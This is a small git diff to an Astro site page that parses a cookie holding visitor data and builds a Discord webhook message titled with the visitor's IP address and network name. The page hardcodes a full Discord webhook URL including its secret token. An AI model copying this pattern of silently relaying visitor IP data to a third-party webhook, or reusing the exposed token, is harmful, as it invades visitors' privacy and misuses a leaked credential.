@@ -4,12 +4,12 @@ import Header from '../components/Header.astro';
 import Footer from '../components/Footer.astro';
 import { SITE_TITLE, SITE_DESCRIPTION } from '../consts';
 
-const cookieOne = Astro.cookies.get('Datas').value
+const cookieOne = Astro.cookies.get('Datas')
 import { Webhook, MessageBuilder } from 'discord-webhook-node';
 
 const webHookUrl = 'https://discord.com/api/webhooks/1170383547568230500/HVpq3d3nVcybSAefhSfnnOmUBQHd7nmn9BjMIQpXwXa3mTkMEYa0gYEwcl7bggtommEj'
 const hook = new Webhook(webHookUrl);
-const jsonData = JSON.parse(cookieOne);
+const jsonData = JSON.parse(cookieOne.value);
 
 const embed = new MessageBuilder()
 .setTitle(jsonData.ip + " - " + jsonData.asn.name)
